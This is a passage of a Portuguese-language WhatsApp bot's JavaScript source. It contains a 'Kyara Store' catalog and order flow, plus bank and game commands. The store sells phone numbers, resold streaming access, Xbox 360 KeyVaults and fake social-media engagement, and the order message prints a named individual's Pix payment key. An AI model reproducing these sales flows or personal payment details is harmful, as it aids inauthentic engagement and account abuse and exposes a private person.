    header: proto.Message.InteractiveMessage.Header.create({
      title: '',
      hasMediaAttachment: true,
      imageMessage: mediaAdm.imageMessage
    }),
    body: proto.Message.InteractiveMessage.Body.create({
      text: `╭━━〔 ☎️ NÚMERO BR 〕━━⬣
┃
┃ ☎️ *Número brasileiro*
┃ 💰 Valor: R$ 15,00
┃
┃ Número nacional para uso
┃ conforme disponibilidade.
┃
╰━━━━━━━━━━━━━━⬣`
    }),
    footer: proto.Message.InteractiveMessage.Footer.create({
      text: 'Produto 4 • Kyara Store'
    }),
    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
      buttons: [
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: "🛒 Comprar Número BR",
            id: `${prefix}comprar 4`
          })
        }
      ]
    })
  })

  cards.push({
    header: proto.Message.InteractiveMessage.Header.create({
      title: '',
      hasMediaAttachment: true,
      imageMessage: mediaP.imageMessage
    }),
    body: proto.Message.InteractiveMessage.Body.create({
      text: `╭━━〔 🎮 GAME PASS 〕━━⬣
┃
┃ 🎮 *Xbox Game Pass*
┃ 💰 Valor: R$ 27,00
┃
┃ Produto para Xbox.
┃ Entrega após confirmação.
┃
╰━━━━━━━━━━━━━━⬣`
    }),
    footer: proto.Message.InteractiveMessage.Footer.create({
      text: 'Produto 5 • Kyara Store'
    }),
    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
      buttons: [
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: "🛒 Comprar Game Pass",
            id: `${prefix}comprar 5`
          })
        }
      ]
    })
  })

  cards.push({
    header: proto.Message.InteractiveMessage.Header.create({
      title: '',
      hasMediaAttachment: true,
      imageMessage: mediaP.imageMessage
    }),
    body: proto.Message.InteractiveMessage.Body.create({
      text: `╭━━〔 📈 REDES SOCIAIS 〕━━⬣
┃
┃ 📈 *IMPULSIONE SUAS REDES*
┃ 💰 A partir de R$ 0,20
┃
┃ Serviços para redes sociais:
┃ seguidores, curtidas, views
┃ e engajamento.
┃
╰━━━━━━━━━━━━━━⬣`
    }),
    footer: proto.Message.InteractiveMessage.Footer.create({
      text: 'Produto 6 • Kyara Store'
    }),
    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
      buttons: [
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: "🛒 Ver impulsionamento",
            id: `${prefix}comprar 6`
          })
        }
      ]
    })
  })

  cards.push({
    header: proto.Message.InteractiveMessage.Header.create({
      title: '',
      hasMediaAttachment: true,
      imageMessage: mediaDono.imageMessage
    }),
    body: proto.Message.InteractiveMessage.Body.create({
      text: `╭━━〔 ❤️ KEYVAULTS 〕━━⬣
┃
┃ ❤️ *KeyVaults Xbox360*
┃ 💰 Valor: R$ 25,00
┃
┃ Produto para Xbox 360.
┃ Consulte disponibilidade.
┃
╰━━━━━━━━━━━━━━⬣`
    }),
    footer: proto.Message.InteractiveMessage.Footer.create({
      text: 'Produto 7 • Kyara Store'
    }),
    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
      buttons: [
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: "🛒 Comprar KeyVault",
            id: `${prefix}comprar 7`
          })
        }
      ]
    })
  })

  cards.push({
    header: proto.Message.InteractiveMessage.Header.create({
      title: '',
      hasMediaAttachment: true,
      imageMessage: mediaAdm.imageMessage
    }),
    body: proto.Message.InteractiveMessage.Body.create({
      text: `╭━━〔 🌍 NÚMEROS 〕━━⬣
┃
┃ 🌍 *Números internacionais*
┃ 💰 A partir de R$ 3,00
┃
┃ Números de outros países.
┃ Valores variam por região.
┃
╰━━━━━━━━━━━━━━⬣`
    }),
    footer: proto.Message.InteractiveMessage.Footer.create({
      text: 'Produto 8 • Kyara Store'
    }),
    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
      buttons: [
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: "🛒 Comprar Número INT",
            id: `${prefix}comprar 8`
          })
        }
      ]
    })
  })

  cards.push({
    header: proto.Message.InteractiveMessage.Header.create({
      title: '',
      hasMediaAttachment: true,
      imageMessage: mediaDono.imageMessage
    }),
    body: proto.Message.InteractiveMessage.Body.create({
      text: `╭━━〔 🔥 KYARA 〕━━⬣
┃
┃ 🔥 *Bot Kyara*
┃ 💰 Valor: R$ 30,00
┃
┃ Base/bot com funções,
┃ menus e sistemas prontos.
┃
╰━━━━━━━━━━━━━━⬣`
    }),
    footer: proto.Message.InteractiveMessage.Footer.create({
      text: 'Produto 9 • Kyara Store'
    }),
    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
      buttons: [
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: "🛒 Comprar Kyara",
            id: `${prefix}comprar 9`
          })
        }
      ]
    })
  })

  cards.push({
    header: proto.Message.InteractiveMessage.Header.create({
      title: '',
      hasMediaAttachment: true,
      imageMessage: mediaP.imageMessage
    }),
    body: proto.Message.InteractiveMessage.Body.create({
      text: `╭━━〔 🛠️ SERVIÇO 〕━━⬣
┃
┃ 🛠️ *Serviço Personalizado*
┃ 💰 Sob orçamento
┃
┃ Precisa de algo específico?
┃ Peça orçamento direto pelo bot.
┃
╰━━━━━━━━━━━━━━⬣`
    }),
    footer: proto.Message.InteractiveMessage.Footer.create({
      text: 'Produto 10 • Kyara Store'
    }),
    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
      buttons: [
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: "🛒 Fazer orçamento",
            id: `${prefix}comprar 10`
          })
        }
      ]
    })
  })

  const msgCarousel = generateWAMessageFromContent(from, {
    viewOnceMessage: {
      message: {
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `╭━━〔 🛒 KYARA STORE 〕━━⬣
┃ Catálogo interativo carregado.
┃ Escolha um produto abaixo.
┃
┃ 👤 Cliente: ${pushname}
┃ 📅 Data: ${date}
┃ ⏰ Hora: ${hora}
╰━━━━━━━━━━━━━━⬣`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: 'KYARA ❤️‍🔥'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.create({
            cards
          })
        })
      }
    }
  }, { quoted: info })

  await conn.relayMessage(from, msgCarousel.message, {
    messageId: msgCarousel.key.id
  })

} catch (e) {
  console.log("❌ ERRO CATÁLOGO CARROSSEL:", e)
  await conn.sendMessage(from, {
    text: `❌ Erro no catálogo interativo:\n${e.message}`
  }, { quoted: info })
}
}
break;

case 'comprar': {
try {
const produtos = {
"1": { nome: "🤖 BOT PERSONALIZÁVEL", valor: 25, entrega: "bot_personalizado" },
"2": { nome: "🌐 Site HTML", valor: 100, entrega: "site_html" },
"3": { nome: "📺 Netflix + Prime 30 Dias", valor: 15, entrega: "streaming" },
"4": { nome: "☎️ Número brasileiro", valor: 15, entrega: "numero_br" },
"5": { nome: "🎮 Xbox Game Pass", valor: 27, entrega: "gamepass" },
"6": { nome: "📈 IMPULSIONE SUAS REDES", valor: 0.20, entrega: "redes_sociais" },
"7": { nome: "❤️ KeyVaults Xbox360", valor: 25, entrega: "keyvault" },
"8": { nome: "🌍 Números internacionais", valor: 3, entrega: "numero_int" },
"9": { nome: "🔥 Bot Kyara", valor: 30, entrega: "kyara_md" },
"10": { nome: "🛠️ Serviço Personalizado", valor: 0, entrega: "orcamento" }
};

const produto = produtos[args[0]];

if (!produto) {
return reply(`❌ Produto não encontrado.

Use: ${prefix}catalogo`);
}

const pedidos = carregarPedidos();
const pedidoId = `PED${Date.now()}`;

pedidos[pedidoId] = {
id: pedidoId,
user: sender,
nome: pushname,
produto: produto.nome,
valor: produto.valor,
entrega: produto.entrega,
status: 'aguardando_comprovante',
criadoEm: Date.now()
};

salvarPedidos(pedidos);

await conn.sendMessage(sender, {
text:
`🛒 *PEDIDO CRIADO*

🆔 Pedido: ${pedidoId}
📦 Produto: ${produto.nome}
💰 Valor: ${produto.valor === 0 ? 'Sob orçamento' : `R$ ${produto.valor.toFixed(2)}`}

💸 *PIX*
📧 Chave Pix: 9dd26dab-1058-4150-a1ed-426e299555f5

🏦 Mercado Pago
👤 Nome: Juan Pablo da Silva Cassemiro

📸 Após pagar, envie aqui no privado:
• print do comprovante
• ou PDF do comprovante

⚠️ Seu pedido será enviado para análise automática.`
});

await reply('✅ Pedido criado! Enviei as informações de pagamento no seu privado.');

} catch (e) {
console.log('[COMPRAR/PEDIDO ERROR]', e);
reply('❌ Erro ao criar pedido.');
}
}
break;

case 'aprovar': {
try {
if (!So_Dono) return reply('❌ Apenas o dono pode aprovar pedidos.');
if (isGroup) return reply('❌ Use esse comando no privado do bot.');

const pedidoId = args[0];
if (!pedidoId) return reply(`Use: ${prefix}aprovar PEDIDO_ID`);

const pedidos = carregarPedidos();
const pedido = pedidos[pedidoId];

if (!pedido) return reply('❌ Pedido não encontrado.');

pedido.status = 'aprovado';
pedido.aprovadoEm = Date.now();
salvarPedidos(pedidos);

await conn.sendMessage(pedido.user, {
text:
`✅ *PAGAMENTO APROVADO!*

🆔 Pedido: ${pedido.id}
📦 Produto: ${pedido.produto}

🎉 Seu pedido foi aprovado.
Aguarde a entrega do produto.`
});

reply(`✅ Pedido ${pedidoId} aprovado e o cliente foi avisado.`);
} catch (e) {
console.log('[APROVAR ERROR]', e);
reply('❌ Erro ao aprovar pedido.');
}
}
break;

case 'recusar': {
try {

if (!So_Dono)
return reply('❌ Apenas o dono pode usar este comando.');

if (isGroup)
return reply('❌ Use este comando no privado do bot.');

const pedidoId = args[0];

if (!pedidoId)
return reply(`Use:\n${prefix}recusar PEDIDO_ID`);

const pedidos = carregarPedidos();

const pedido = pedidos[pedidoId];

if (!pedido)
return reply('❌ Pedido não encontrado.');

pedido.status = 'recusado';
pedido.recusadoEm = Date.now();

salvarPedidos(pedidos);

await conn.sendMessage(pedido.user, {
text:
`❌ *PAGAMENTO RECUSADO*

🆔 Pedido: ${pedido.id}
📦 Produto: ${pedido.produto}

Seu comprovante não foi aprovado.

Caso ache que houve algum erro,
entre em contato com o suporte.`
});

reply(
`✅ Pedido recusado com sucesso.

🆔 ${pedido.id}
👤 ${pedido.nome}
📦 ${pedido.produto}`
);

} catch (e) {
console.log('[RECUSAR ERROR]', e);
reply('❌ Erro ao recusar pedido.');
}
}
break;

case 'pubdoc': {
try {
console.log("DONO TESTE:", {
sender,
dono1,
Numero1,
So_Dono,
IsCreator,
SoCriador
});

if (!So_Dono) return reply('Apenas o dono pode usar esse comando manin.');

const CANAIS = [
'120363427471727828@newsletter',
'120363403609666063@newsletter',
'120363404513275411@newsletter',
'120363420749127053@newsletter'
];

const IMG_DEFAULT = 'https://files.catbox.moe/mzdkxd.jpg';

if (!q) return reply(
`╔━᳀『 *Publicar Case* 』═᳀
⌬ *Uso:* ${prefix}pubdoc <nome>/<descrição>
⌬ *Ex:* ${prefix}pubdoc attp/figurinha animada com texto
⌬ Responda à mensagem com o código
╚━═━═━═━═━═━═━═━═᳀`
);

const split = q.split('/');
if (split.length < 2) return reply('Use: nome/descrição');

const nome = split[0].trim();
const descricao = split.slice(1).join('/').trim();

const ctx = info?.message?.extendedTextMessage?.contextInfo;
const quotedMsg = ctx?.quotedMessage;

const codigo =
quotedMsg?.conversation ||
quotedMsg?.extendedTextMessage?.text ||
quotedMsg?.imageMessage?.caption ||
quotedMsg?.videoMessage?.caption ||
null;

if (!codigo || codigo.trim().length < 3) {
return reply('Responda à mensagem que contém o código da case.');
}

await conn.sendMessage(from, { react: { text: '⏳', key: info.key } });
await reply('Fazendo upload no Catbox...');

if (!fs.existsSync('./tmp')) {
fs.mkdirSync('./tmp');
}

const nomeArquivo = `${nome.replace(/[^a-z0-9]/gi, '_')}_${Date.now()}.txt`;
const caminhoArquivo = `./tmp/${nomeArquivo}`;

fs.writeFileSync(caminhoArquivo, codigo.trim());

const form = new FormData();
form.append('reqtype', 'fileupload');
form.append('fileToUpload', fs.createReadStream(caminhoArquivo));

const { data: catboxURL } = await axios.post(
'https://catbox.moe/user/api.php',
form,
{ headers: form.getHeaders() }
);

fs.unlinkSync(caminhoArquivo);

const pasteURL = String(catboxURL).trim();

if (!pasteURL.startsWith('https://')) {
throw new Error('Catbox recusou: ' + pasteURL);
}

let imageMessage = null;

try {
const prepared = await prepareWAMessageMedia(
{ image: { url: IMG_DEFAULT } },
{ upload: conn.waUploadToServer }
);

imageMessage = prepared.imageMessage;
} catch (e) {
console.log('Erro ao preparar imagem:', e.message);
}

const caption =
`╔══════════════════════╗
║       🤖 KYARA 🤖          ║
║      Powered by Kyara-AI™.      ║
╚══════════════════════╝

📂 ${nome}

📝 Descrição
${descricao}

━━━━━━━━━━━━━━━━━━


⚡ Cases Exclusivas • Bots • IA`;

for (const canal of CANAIS) {

const msg = generateWAMessageFromContent(canal, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: imageMessage ? {
hasMediaAttachment: true,
imageMessage
} : {
hasMediaAttachment: false
},
body: {
text: caption
},
footer: {
text: 'ᶜˡⁱᵠᵘᵉ ᵃᵇᵃⁱˣᵒ ᵖᵃʳᵃ ᵃᵇʳⁱʳ'
},
nativeFlowMessage: {
buttons: [
{
name: 'cta_url',
buttonParamsJson: JSON.stringify({
display_text: '📄 ᴀʙʀɪʀ ᴅᴏᴄ',
url: pasteURL,
merchant_url: pasteURL
})
},
{
name: 'cta_url',
buttonParamsJson: JSON.stringify({
display_text: '🌐 𝑍𝑦𝑟𝑜𝑛-𝐴𝑖 & 𝑁𝑋𝑅ᵒᶠᶜ',
url: 'https://',
merchant_url: 'https://'
})
}
]
}
}
}
}
}, { userJid: conn.user.id });

await conn.relayMessage(canal, msg.message, {
messageId: msg.key.id
});

}

await conn.sendMessage(from, { react: { text: '✅', key: info.key } });
reply(`*Case publicada nos canais!*\n${pasteURL}`);

} catch (e) {
console.error('[pubdoc]', e);
await conn.sendMessage(from, { react: { text: '❌', key: info.key } });

const erro = e.response?.data || e.message || 'desconhecido';
reply('Erro ao publicar: ' + erro);
}
}
break;

// CASES DE DONO
//créditos: @kyara
case 'banco':
case 'bank':
case 'saldo': {
try {

let banco = carregarBanco();

const user = getUserBancoId(info, sender, isGroup);

console.log('BANCO USER:', user);
console.log('BANCO DADOS:', banco[user]);

verificarConta(banco, user);

if (!banco[user].inventario) banco[user].inventario = {};
if (!banco[user].pets) banco[user].pets = {};
if (!banco[user].batalhaNaval) banco[user].batalhaNaval = {
partidas: 0,
vitorias: 0,
derrotas: 0,
recompensaTotal: 0
};

let listaInv = '';
for (const item in banco[user].inventario) {
    const dados = banco[user].inventario[item];

    const qtd = typeof dados === 'number'
        ? dados
        : (dados?.qtd ?? 0);

    const valor = typeof dados === 'number'
        ? 0
        : (dados?.valor ?? 0);

    listaInv += `⌬ ${item} (${qtd}x) • *$${valor * qtd}*\n`;
}
if (!listaInv) listaInv = '⌬ 📦 Nenhum item guardado.';

let listaPets = '';
for (const pet in banco[user].pets) {
const dados = banco[user].pets[pet];
listaPets += `⌬ ${pet} (${dados.qtd}x)\n`;
}
if (!listaPets) listaPets = '⌬ 🐾 Nenhum pet guardado.';

const naval = banco[user].batalhaNaval;

reply(`╭━━━〔 🏦 𝐙𝐘𝐑𝐎𝐍 𝐁𝐀𝐍𝐊 〕━━━⬣
┃ 👤 Usuário: ${pushname}
┃ 💰 Saldo: $${banco[user].saldo}
┃ ✨ XP: ${banco[user].xp}
┃
┣━━━〔 🎒 𝐈𝐍𝐕𝐄𝐍𝐓𝐀́𝐑𝐈𝐎 〕━━━⬣
${listaInv.trim() || '┃ 📭 Inventário vazio.'}
┃
┣━━━〔 🐾 𝐏𝐄𝐓𝐒 𝐆𝐔𝐀𝐑𝐃𝐀𝐃𝐎𝐒 〕━━━⬣
${listaPets.trim() || '┃ 🐾 Nenhum pet guardado.'}
┃
┣━━━〔 💸 𝐌𝐄𝐑𝐂𝐀𝐃𝐎 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣
┃ 📦 Vender item:
┃ ${prefix}venderitem <nome> <quantidade>
┃
┃ 🐾 Vender pet:
┃ ${prefix}venderpet <nome> <quantidade>
┃
┃ 💡 Exemplo:
┃ ${prefix}venderitem Peixe 2
┃ ${prefix}venderpet Cachorro 1
┃
┣━━━〔 📌 𝐏𝐄𝐍𝐃𝐄̂𝐍𝐂𝐈𝐀𝐒 〕━━━⬣
┃ 🎣 Pesca: ${banco[user].pescaPendente ? '✅ Sim' : '❌ Não'}
┃ ⛏️ Mineração: ${banco[user].mineracaoPendente ? '✅ Sim' : '❌ Não'}
┃ 🏹 Caça: ${banco[user].cacaPendente ? '✅ Sim' : '❌ Não'}
┃
┣━━━〔 🚢 𝐁𝐀𝐓𝐀𝐋𝐇𝐀 𝐍𝐀𝐕𝐀𝐋 〕━━━⬣
┃ 🎮 Partidas: ${naval.partidas}
┃ 🏆 Vitórias: ${naval.vitorias}
┃ 💀 Derrotas: ${naval.derrotas}
┃ 💰 Recompensa total: $${naval.recompensaTotal}
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`);

salvarBanco(banco);

} catch (e) {
console.log(e);
reply('Erro ao abrir banco.');
}
}
break;

case 'meuid': {
reply(`╭━━━〔 🆔 𝐙𝐘𝐑𝐎𝐍 𝐈𝐃 〕━━━⬣
┃ 👤 Usuário: ${pushname}
┃
┣━━━〔 📡 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐂̧𝐎̃𝐄𝐒 〕━━━⬣
┃ 🆔 Sender:
┃ ${sender}
┃
┃ 👥 Participant:
┃ ${info.key.participant || 'Não encontrado'}
┃
┃ 📋 ParticipantPn:
┃ ${info.key.participantPn || 'Não encontrado'}
┃
┃ 🌐 RemoteJid:
┃ ${info.key.remoteJid}
┃
┣━━━〔 ⚙️ 𝐃𝐀𝐃𝐎𝐒 𝐓𝐄́𝐂𝐍𝐈𝐂𝐎𝐒 〕━━━⬣
┃ 🤖 Sistema: Kyara
┃ ❤️‍🔥 IA: Kyara-AI
┃ 🔐 Identificação concluída
┃
╰━━━〔 🚀 𝐆𝐙𝐄𝐄 𝐒𝐂𝐑𝐈𝐏𝐓𝐒 𝐃𝐄𝐕 〕━━━⬣`);
}
break;

// CASES DE BRINCADEIRAS
// créditos: @kyara

case 'ppt':
case 'jokenpo':
case 'pedrapapeltesoura': {
try {
if (!isGroup) return reply('❌ Só funciona em grupo.');

global.ppt = global.ppt || {};

const sub = args[0]?.toLowerCase();

if (!sub) return reply(`╭━━〔 ✊ JOKENPÔ PVP 〕━━⬣
┃ Use:
┃ ${prefix}ppt desafiar @5519999999999 100
┃ ${prefix}ppt aceitar
┃ ${prefix}ppt pedra
┃ ${prefix}ppt papel
┃ ${prefix}ppt tesoura
┃ ${prefix}ppt cancelar
╰━━━━━━━━━━━━━━⬣`);

if (sub === 'cancelar') {
const partida = global.ppt[from];
if (!partida) return reply('❌ Não tem partida ativa.');

const senderNorm = jidNormalizedUser(sender);

if (![partida.p1, partida.p2].includes(senderNorm) && !So_Dono) {
return reply('❌ Só jogadores podem cancelar.');
}

delete global.ppt[from];
return reply('🗑️ Partida cancelada.');
}

if (sub === 'desafiar') {
if (global.ppt[from]) return reply('❌ Já existe uma partida ativa nesse grupo.');

let alvo = null;
const ctx = info?.message?.extendedTextMessage?.contextInfo || {};

if (ctx.mentionedJid?.[0] && ctx.mentionedJid[0].includes('@')) {
alvo = ctx.mentionedJid[0];
} else {
const numeroTexto = q.match(/@?(\d{8,15})/);
if (numeroTexto) alvo = `${numeroTexto[1]}@s.whatsapp.net`;
}

if (!alvo) {
return reply(`❌ Marque alguém ou coloque o número.\nEx: ${prefix}ppt desafiar @5519999999999 100`);
}

alvo = jidNormalizedUser(alvo);
const senderNorm = jidNormalizedUser(sender);
const botNorm = jidNormalizedUser(botNumber);

if (alvo === senderNorm) return reply('❌ Você não pode desafiar você mesmo.');
if (alvo === botNorm) return reply('❌ Não vou jogar contigo, sou ocupado.');

let aposta = parseInt(args.find(a => /^\d+$/.test(a))) || 0;
if (aposta < 0) aposta = 0;

if (aposta > 0) {
if (!global.db?.data?.users?.[senderNorm]) global.db.data.users[senderNorm] = { money: 0, saldo: 0 };
if (!global.db?.data?.users?.[alvo]) global.db.data.users[alvo] = { money: 0, saldo: 0 };

let saldo1 = global.db.data.users[senderNorm].money || global.db.data.users[senderNorm].saldo || 0;
let saldo2 = global.db.data.users[alvo].money || global.db.data.users[alvo].saldo || 0;

if (saldo1 < aposta) return reply('❌ Você não tem saldo para essa aposta.');
if (saldo2 < aposta) return reply('❌ O desafiado não tem saldo para essa aposta.');
}

global.ppt[from] = {
p1: senderNorm,
p2: alvo,
aposta,
escolhas: {},
aceito: false,
criado: Date.now()
};

return conn.sendMessage(from, {
text: `╭━━〔 ⚔️ DESAFIO JOKENPÔ 〕━━⬣
┃ 👤 Desafiante: @${senderNorm.split('@')[0]}
┃ 🎯 Desafiado: @${alvo.split('@')[0]}
┃ 💰 Aposta: R$${aposta}
┃
┃ Para aceitar:
┃ ${prefix}ppt aceitar
╰━━━━━━━━━━━━━━⬣`,
mentions: [senderNorm, alvo]
}, { quoted: selo });
}

if (sub === 'aceitar') {
const partida = global.ppt[from];
if (!partida) return reply('❌ Não tem desafio ativo.');

const senderNorm = jidNormalizedUser(sender);

if (senderNorm !== partida.p2) return reply('❌ Só o desafiado pode aceitar.');

partida.aceito = true;

return conn.sendMessage(from, {
text: `╭━━〔 ✅ DESAFIO ACEITO 〕━━⬣
┃ @${partida.p1.split('@')[0]} vs @${partida.p2.split('@')[0]}
┃
┃ Escolham:
┃ ${prefix}ppt pedra
┃ ${prefix}ppt papel
┃ ${prefix}ppt tesoura
╰━━━━━━━━━━━━━━⬣`,
mentions: [partida.p1, partida.p2]
}, { quoted: selo });
}

if (['pedra', 'papel', 'tesoura'].includes(sub)) {
const partida = global.ppt[from];
if (!partida) return reply('❌ Não tem partida ativa.');
if (!partida.aceito) return reply('❌ O desafio ainda não foi aceito.');

const senderNorm = jidNormalizedUser(sender);

if (![partida.p1, partida.p2].includes(senderNorm)) return reply('❌ Você não está nessa partida.');

if (partida.escolhas[senderNorm]) return reply('❌ Você já escolheu.');

partida.escolhas[senderNorm] = sub;

await conn.sendMessage(from, {
text: `✅ Escolha registrada para @${senderNorm.split('@')[0]}.`,
mentions: [senderNorm]
}, { quoted: selo });

if (!partida.escolhas[partida.p1] || !partida.escolhas[partida.p2]) {
return reply('⏳ Aguardando o outro jogador escolher...');
}

const e1 = partida.escolhas[partida.p1];
const e2 = partida.escolhas[partida.p2];

let vencedor = null;

if (e1 === e2) {
vencedor = null;
} else if (
(e1 === 'pedra' && e2 === 'tesoura') ||
(e1 === 'papel' && e2 === 'pedra') ||
(e1 === 'tesoura' && e2 === 'papel')
) {
vencedor = partida.p1;
} else {
vencedor = partida.p2;
}

const emoji = {
pedra: '✊',
papel: '📄',
tesoura: '✂️'
};

let txt = `╭━━〔 🎮 RESULTADO JOKENPÔ 〕━━⬣
┃ @${partida.p1.split('@')[0]} escolheu: ${emoji[e1]} ${e1}
┃ @${partida.p2.split('@')[0]} escolheu: ${emoji[e2]} ${e2}
┃
`;

if (!vencedor) {
txt += `┃ 🤝 Resultado: Empate
┃ 💰 Ninguém perdeu dinheiro`;
} else {
const perdedor = vencedor === partida.p1 ? partida.p2 : partida.p1;

if (partida.aposta > 0) {
if (!global.db.data.users[vencedor]) global.db.data.users[vencedor] = { money: 0, saldo: 0 };
if (!global.db.data.users[perdedor]) global.db.data.users[perdedor] = { money: 0, saldo: 0 };

global.db.data.users[vencedor].money = (global.db.data.users[vencedor].money || 0) + partida.aposta;
global.db.data.users[perdedor].money = Math.max(0, (global.db.data.users[perdedor].money || 0) - partida.aposta);

global.db.data.users[vencedor].saldo = global.db.data.users[vencedor].money;
global.db.data.users[perdedor].saldo = global.db.data.users[perdedor].money;
}

txt += `┃ 🏆 Vencedor: @${vencedor.split('@')[0]}
┃ ☠️ Perdedor: @${perdedor.split('@')[0]}
┃ 💰 Prêmio: R$${partida.aposta}`;
}

txt += `
╰━━━━━━━━━━━━━━⬣`;

const mentions = [partida.p1, partida.p2];

delete global.ppt[from];

return conn.sendMessage(from, {
text: txt,
mentions
}, { quoted: selo });
}

reply('❌ Opção inválida.');

} catch (e) {
console.log('[PPT ERROR]', e);
reply('❌ Erro no pedra, papel e tesoura.');
}
}
break;

case '2048': {
  const idJogo = from
  const acao = q.trim().toLowerCase()

  if (!acao || acao === 'iniciar') {
    jogos2048[idJogo] = {
      board: novo2048(),
      score: 0
    }

    return reply(mostrar2048(jogos2048[idJogo].board, 0))
  }

  if (!jogos2048[idJogo]) {
    return reply(`Nenhum jogo 2048 iniciado.\nUse: ${prefix}2048`)
  }

  if (acao === 'sair' || acao === 'desistir') {
    delete jogos2048[idJogo]
    return reply('🎮 Jogo 2048 encerrado.')
  }

  if (acao === 'ver') {
    return reply(mostrar2048(jogos2048[idJogo].board, jogos2048[idJogo].score))
  }

  const direcoes = ['cima', 'baixo', 'esquerda', 'direita']

  if (!direcoes.includes(acao)) {
    return reply(
      `Use assim:\n\n` +
      `${prefix}2048 cima\n` +
      `${prefix}2048 baixo\n` +
      `${prefix}2048 esquerda\n` +
      `${prefix}2048 direita\n` +
      `${prefix}2048 sair`
    )
  }

  const jogo = jogos2048[idJogo]
  const antes = clonar2048(jogo.board)
  const mov = mover2048(jogo.board, acao)

  if (igual2048(antes, mov.board)) {
    return reply('❌ Não dá pra mover nessa direção.')
  }

  jogo.board = mov.board
  jogo.score += mov.pontos
  add2048(jogo.board)

  const ganhou = jogo.board.flat().includes(2048)

  if (ganhou) {
    const textoFinal = mostrar2048(jogo.board, jogo.score)
    delete jogos2048[idJogo]
    return reply(`🏆 Você venceu o 2048!\n\n${textoFinal}`)
  }

  if (perdeu2048(jogo.board)) {
    const textoFinal = mostrar2048(jogo.board, jogo.score)
    delete jogos2048[idJogo]
    return reply(`💀 Você perdeu!\n\n${textoFinal}`)
  }

  return reply(mostrar2048(jogo.board, jogo.score))
}
break

case 'sudoku': {
  const idJogo = from

  if (!q) {
    const novo = gerarSudoku()

    jogosSudoku[idJogo] = {
      tabuleiro: JSON.parse(JSON.stringify(novo.puzzle)),
      fixos: JSON.parse(JSON.stringify(novo.puzzle)),
      solution: novo.solution
    }

    return reply(mostrarSudoku(jogosSudoku[idJogo].tabuleiro))
  }

  if (!jogosSudoku[idJogo]) {
    return reply(`Nenhum Sudoku iniciado.\nUse: ${prefix}sudoku`)
  }

  if (q.toLowerCase() === 'desistir') {
    delete jogosSudoku[idJogo]
    return reply('🧩 Sudoku encerrado.')
  }

  if (q.toLowerCase() === 'ver') {
    return reply(mostrarSudoku(jogosSudoku[idJogo].tabuleiro))
  }

  const argsSudoku = q.trim().split(/\s+/).map(Number)

  if (argsSudoku.length !== 3) {
    return reply(
      `Use assim:\n${prefix}sudoku linha coluna número\n\nExemplo:\n${prefix}sudoku 1 3 4`
    )
  }

  let [linha, coluna, numero] = argsSudoku

  if (
    linha < 1 || linha > 9 ||
    coluna < 1 || coluna > 9 ||
    numero < 1 || numero > 9
  ) {
    return reply('❌ Linha, coluna e número devem ser de 1 a 9.')
  }

  linha--
  coluna--

  const jogo = jogosSudoku[idJogo]

  if (jogo.fixos[linha][coluna] !== 0) {
    return reply('❌ Essa posição já veio preenchida, não dá pra alterar.')
  }

  if (jogo.solution[linha][coluna] !== numero) {
    return reply('❌ Número errado nessa posição.')
  }

  jogo.tabuleiro[linha][coluna] = numero

  if (sudokuCompleto(jogo.tabuleiro)) {
    delete jogosSudoku[idJogo]
    return reply(`🎉 Parabéns! Você completou o Sudoku!\n\n${mostrarSudoku(jogo.tabuleiro)}`)
  }

  return reply(`✅ Correto!\n\n${mostrarSudoku(jogo.tabuleiro)}`)
}
break

case 'forca': {
  if (!global.forca) global.forca = {};

  if (global.forca[from]) {
    return reply(`❌ Já existe uma forca ativa nesse chat!\n\nUse: ${prefix}letra A\nOu: ${prefix}chutar PALAVRA`);
  }

  const palavras = [
    { palavra: 'JAVASCRIPT', dica: 'Linguagem de programação' },
    { palavra: 'WHATSAPP', dica: 'Aplicativo de mensagens' },
    { palavra: 'PROGRAMACAO', dica: 'O que um desenvolvedor faz' },
    { palavra: 'COMPUTADOR', dica: 'Máquina eletrônica' },
    { palavra: 'INTERNET', dica: 'Rede mundial' },
    { palavra: 'DESENVOLVEDOR', dica: 'Cria sistemas e aplicativos' },
    { palavra: 'FIREBASE', dica: 'Plataforma do Google' },
    { palavra: 'TERMUX', dica: 'Terminal para Android' },
    { palavra: 'HOSPEDAGEM', dica: 'Onde um site fica online' },
    { palavra: 'KYARAMD', dica: 'Nome de um bot' },
    { palavra: 'NODEJS', dica: 'Ambiente JavaScript' },
    { palavra: 'GITHUB', dica: 'Hospeda códigos' },
    { palavra: 'ANDROID', dica: 'Sistema operacional mobile' },
    { palavra: 'SERVIDOR', dica: 'Fornece serviços na rede' },
    { palavra: 'ALGORITMO', dica: 'Sequência lógica' },
    { palavra: 'BAILEYS', dica: 'Biblioteca para bot WhatsApp' },
    { palavra: 'TERMINAL', dica: 'Interface de comandos' },
    { palavra: 'SCRIPT', dica: 'Código automatizado' },
    { palavra: 'COMANDO', dica: 'Instrução do sistema' },
    { palavra: 'AUTOMACAO', dica: 'Tarefa feita automaticamente' },
    { palavra: 'NODEJS', dica: 'Ambiente de execução JavaScript' },
    { palavra: 'GITHUB', dica: 'Plataforma para hospedar códigos' },
